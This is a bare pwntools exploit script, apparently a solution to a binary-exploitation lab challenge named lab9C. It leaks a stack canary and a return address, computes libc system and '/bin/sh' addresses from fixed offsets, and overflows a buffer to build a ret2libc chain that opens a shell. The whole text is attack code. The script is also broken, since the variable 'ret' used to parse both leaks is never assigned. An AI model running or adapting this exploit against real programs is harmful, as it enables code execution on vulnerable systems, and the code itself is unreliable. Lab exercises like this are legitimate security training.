from pwn import *
proc = process("/levels/lab09/lab9C")
proc.sendline("2")
proc.sendline("257")
proc.recv(500)
canary = int(ret.split('\n')[0].split()[-1])

proc.sendline("2")
proc.sendline("261")
proc.recv(500)

return_addr = int(ret.split('\n')[0].split()[-1])
retn = return_addr & 0xffffffff if return_addr < 0 else return_addr
can = canary & 0xffffffff if canary < 0 else canary

sys = retn + 0x2681d
binsh = retn + 0x149259

buff = [42] * 256

for num in buff:
    proc.sendline("1")
    proc.sendline(str(num))
    proc.recv(500)

proc.sendline("1")
proc.sendline(str(can))
proc.recv(500)

buff = [42] * 3
for num in buff:
    proc.sendline("1")
    proc.sendline(str(num))
    proc.recv(500)

buff = [sys, 42, binsh]
for num in buff:
    proc.sendline("1")
    proc.recv(500)
    print(str(num))
    proc.sendline(str(num))
    proc.recv(500)

proc.sendline("3")
proc.interactive()
